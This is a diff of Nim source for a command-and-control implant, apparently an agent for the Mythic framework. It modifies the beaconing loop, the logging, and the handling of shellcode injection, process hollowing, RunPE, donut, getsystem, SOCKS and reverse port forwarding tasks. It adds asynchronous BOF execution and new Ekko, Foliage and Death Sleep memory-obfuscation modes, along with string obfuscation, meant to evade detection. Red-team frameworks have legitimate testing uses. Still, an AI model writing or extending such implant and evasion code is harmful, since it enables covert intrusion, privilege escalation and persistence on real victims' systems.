                   agent.taskResponses.add(bofResp)
                   
                   if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
+                    # Error during setup or immediate completion
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Inline_execute complete"
+                    debugLog "agent", "Inline_execute complete"
+                  elif bofResp.hasKey(obf("status")) and bofResp[obf("status")].getStr() == obf("processing"):
+                    # BOF thread spawned — remove chunk state, async poll will handle completion
+                    agent.backgroundTasks.del(taskId)
+                    debugLog "agent", "BOF thread spawned, async execution started"
                   else:
+                    # Need more chunks
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
             
@@ -1066,7 +1266,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Shinject complete"
+                    debugLog "agent", "Shinject complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1088,12 +1288,12 @@ proc postResponses*(agent: var Agent) =
                   
                   if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Donut complete"
+                    debugLog "agent", "Donut complete"
                   elif donutResp.hasKey(obf("status")) and donutResp[obf("status")].getStr() == obf("processing"):
                     # Execution started in background thread - register as monitoring task
                     agent.backgroundTasks.del(taskId)
                     agent.activeMonitoringTasks[taskId] = mtDonut
-                    debug "[DEBUG] Donut execution started as background task"
+                    debugLog "agent", "Donut execution started as background task"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1115,7 +1315,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Inject hollow complete"
+                    debugLog "agent", "Inject hollow complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1137,7 +1337,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if runpeResp.hasKey(obf("completed")) and runpeResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] RunPE complete"
+                    debugLog "agent", "RunPE complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1158,7 +1358,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if spawnResp.hasKey(obf("completed")) and spawnResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Spawn complete"
+                    debugLog "agent", "Spawn complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1179,7 +1379,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if spawnasResp.hasKey(obf("completed")) and spawnasResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] SpawnAs complete"
+                    debugLog "agent", "SpawnAs complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1200,7 +1400,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if getsysResp.hasKey(obf("completed")) and getsysResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] GetSystem spawn complete"
+                    debugLog "agent", "GetSystem spawn complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1221,7 +1421,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if importResp.hasKey(obf("completed")) and importResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] PowerShell import complete"
+                    debugLog "agent", "PowerShell import complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1242,7 +1442,7 @@ proc postResponses*(agent: var Agent) =
                   
                   if cacheResp.hasKey(obf("completed")) and cacheResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
-                    debug "[DEBUG] Register file complete"
+                    debugLog "agent", "Register file complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1254,7 +1454,7 @@ proc postResponses*(agent: var Agent) =
         if respJson.hasKey(obf("socks")):
           let socksMessages = respJson[obf("socks")].getElems()
           if socksMessages.len > 0:
-            debug "[DEBUG] Processing ", socksMessages.len, " socks message(s) from post_response reply"
+            debugLog "agent", "Processing ", socksMessages.len, " socks message(s) from post_response reply"
             let responses = handleSocksMessages(socksMessages)
             for response in responses:
               agent.taskResponses.add(%*{obf("socks"): [response]})
@@ -1264,7 +1464,7 @@ proc postResponses*(agent: var Agent) =
         if respJson.hasKey(obf("rpfwd")):
           let rpfwdMessages = respJson[obf("rpfwd")].getElems()
           if rpfwdMessages.len > 0:
-            debug "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s) from post_response reply"
+            debugLog "agent", "Processing ", rpfwdMessages.len, " rpfwd message(s) from post_response reply"
             agent.processRpfwd(rpfwdMessages)
       
       # Process interactive messages from post_response reply
@@ -1272,11 +1472,11 @@ proc postResponses*(agent: var Agent) =
         if respJson.hasKey(obf("interactive")):
           let interactiveMessages = respJson[obf("interactive")].getElems()
           if interactiveMessages.len > 0:
-            debug "[DEBUG] Processing ", interactiveMessages.len, " interactive message(s) from post_response reply"
+            debugLog "agent", "Processing ", interactiveMessages.len, " interactive message(s) from post_response reply"
             agent.processInteractive(interactiveMessages)
 
     except:
-      debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
+      debugLog "agent", "Failed to parse post_response reply: ", getCurrentExceptionMsg()
 
 proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
   ## Calculate sleep time with jitter
@@ -1298,7 +1498,7 @@ proc sleep*(agent: Agent) =
   ## Sleep with jitter
   let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
   
-  debug "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
+  debugLog "agent", "Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
          "s, jitter: ", agent.jitter, "%)"
   
   # Close connection before sleeping if sleep time > 0
@@ -1306,17 +1506,34 @@ proc sleep*(agent: Agent) =
   # Performance impact: Only recreates client AFTER sleep, not on every request
   # For sleep=0 (continuous beaconing), this is skipped entirely
   if sleepTime > 0:
-    debug "[DEBUG] Cleaning up profile connection before sleep"
+    debugLog "agent", "Cleaning up profile connection before sleep"
     cleanupConnection(agent)
   
   # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
+  # Skip sleep obfuscation when background tasks are active — those threads execute
+  # code from the agent's memory which sleep obfuscation encrypts, causing crashes
+  let hasBgTasks {.used.} = agent.backgroundTasks.len > 0
   when defined(windows):
     when defined(sleepObfuscationEkko):
-      if sleepTime > 2:
-        debug "[DEBUG] Using Ekko sleep obfuscation"
+      if sleepTime > 2 and not hasBgTasks:
+        debugLog "agent", "Using Ekko sleep obfuscation"
         ekkoObf(sleepTime * 1000)
       else:
-        debug "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
+        debugLog "agent", "Sleep time < 3s or bg tasks active, using regular sleep instead of Ekko"
+        os.sleep(sleepTime * 1000)
+    elif defined(sleepObfuscationFoliage):
+      if sleepTime > 2 and not hasBgTasks:
+        debugLog "agent", "Using Foliage sleep obfuscation"
+        foliageObf(sleepTime * 1000)
+      else:
+        debugLog "agent", "Sleep time < 3s or bg tasks active, using regular sleep instead of Foliage"
+        os.sleep(sleepTime * 1000)
+    elif defined(sleepObfuscationDeathSleep):
+      if sleepTime > 2 and not hasBgTasks:
+        debugLog "agent", "Using Death Sleep obfuscation"
+        deathSleepObf(sleepTime * 1000)
+      else:
+        debugLog "agent", "Sleep time < 3s or bg tasks active, using regular sleep instead of Death Sleep"
         os.sleep(sleepTime * 1000)
     else:
       os.sleep(sleepTime * 1000)
@@ -1327,7 +1544,7 @@ proc sleep*(agent: Agent) =
   # Performance: Creating HttpClient object is cheap (~microseconds)
   # Actual TCP/TLS handshake happens on first request, not here
   if sleepTime > 0:
-    debug "[DEBUG] Reconnecting profile after sleep"
+    debugLog "agent", "Reconnecting profile after sleep"
     reconnectProfile(agent)
 
 proc runAgent*() =
@@ -1336,61 +1553,82 @@ proc runAgent*() =
   
   let cfg = getConfig()
   
-  debug "[DEBUG] runAgent: Starting agent initialization..."
+  debugLog "agent", "runAgent: Starting agent initialization..."
   
   # Initialize random number generator for jitter
   randomize()
   
-  debug "[DEBUG] runAgent: Random seed initialized"
+  debugLog "agent", "runAgent: Random seed initialized"
   
   # Check killdate
   let now = now().format("yyyy-MM-dd")
   if now >= cfg.killdate:
-    debug "[DEBUG] runAgent: Killdate reached, exiting"
+    debugLog "agent", "runAgent: Killdate reached, exiting"
     return
   
-  debug "[DEBUG] runAgent: Creating agent instance..."
+  debugLog "agent", "runAgent: Creating agent instance..."
   
   # Initialize agent
   var agentInstance = newAgent()
   
   # TCP and SMB profiles are special - they run their own listener loops instead of normal agent loop
-  if cfg.profile == "tcp":
-    debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
-    # TCP profile doesn't do normal checkin - clients connect to it
-    # Run the TCP listener loop
-    case agentInstance.profile.kind
-    of pkTcp:
-      waitFor agentInstance.profile.tcpProfile.start()
-    else:
-      discard
-    return
-  
-  if cfg.profile == "smb":
-    when defined(windows):
-      debug "[DEBUG] runAgent: SMB profile detected, starting P2P listener"
-      # SMB profile doesn't do normal checkin - clients connect to it
-      # Run the SMB listener loop
+  when defined(profile_tcp):
+    if cfg.profile == "tcp":
+      debugLog "agent", "runAgent: TCP profile detected, starting P2P listener"
+      # TCP profile doesn't do normal checkin - clients connect to it
+      # Run the TCP listener loop
       case agentInstance.profile.kind
-      of pkSmb:
-        agentInstance.profile.smbProfile.start()
+      of pkTcp:
+        waitFor agentInstance.profile.tcpProfile.start()
       else:
         discard
-    return
+      return
   
-  debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
+  when defined(profile_smb):
+    if cfg.profile == "smb":
+      when defined(windows):
+        debugLog "agent", "runAgent: SMB profile detected, starting P2P listener"
+        # SMB profile doesn't do normal checkin - clients connect to it
+        # Run the SMB listener loop
+        case agentInstance.profile.kind
+        of pkSmb:
+          agentInstance.profile.smbProfile.start()
+        else:
+          discard
+      return
+  
+  debugLog "agent", "runAgent: Agent instance created, starting checkin..."
   
   # Perform initial checkin
   if not agentInstance.checkin():
-    debug "[DEBUG] runAgent: Checkin failed, exiting"
+    debugLog "agent", "runAgent: Checkin failed, exiting"
     return
   
-  debug "[DEBUG] runAgent: Checkin successful, entering main loop"
+  debugLog "agent", "runAgent: Checkin successful, entering main loop"
   
   # Main agent loop
+  var firstLoop = true
   while not agentInstance.shouldExit:
+    # Sleep with jitter (skip on first iteration so first checkin is immediate)
+    if firstLoop:
+      firstLoop = false
+    else:
+      agentInstance.sleep()
+    
     # Get tasking from Mythic (returns tasks, interactive, socks, rpfwd messages, and delegates)
     let (tasks, interactive, socksMessages, rpfwdMessages, delegates) = agentInstance.getTasks()
+    
+    # If getTasks returned nothing (connection failure), skip straight back to sleep
+    if tasks.len == 0 and interactive.len == 0 and socksMessages.len == 0 and rpfwdMessages.len == 0 and delegates.len == 0:
+      # Still check for background task output and post any pending responses
+      agentInstance.checkBackgroundTasks()
+      when defined(cmd_inline_execute) and defined(windows):
+        let bofResponses = checkActiveBofSessions()
+        for response in bofResponses:
+          agentInstance.taskResponses.add(response)
+      if agentInstance.taskResponses.len > 0:
+        agentInstance.postResponses()
+      continue
     
     # Process interactive messages first (PTY input)
     agentInstance.processInteractive(interactive)
@@ -1446,6 +1684,12 @@ proc runAgent*() =
     # Check background tasks (clipboard_monitor, portscan)
     agentInstance.checkBackgroundTasks()
     
+    # Check active BOF sessions for completion (non-blocking poll)
+    when defined(cmd_inline_execute) and defined(windows):
+      let bofResponses = checkActiveBofSessions()
+      for response in bofResponses:
+        agentInstance.taskResponses.add(response)
+    
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
     
@@ -1469,8 +1713,5 @@ proc runAgent*() =
       
       if hasP2pData:
         agentInstance.postResponses()
-    
-    # Sleep with jitter
-    agentInstance.sleep()
 
 
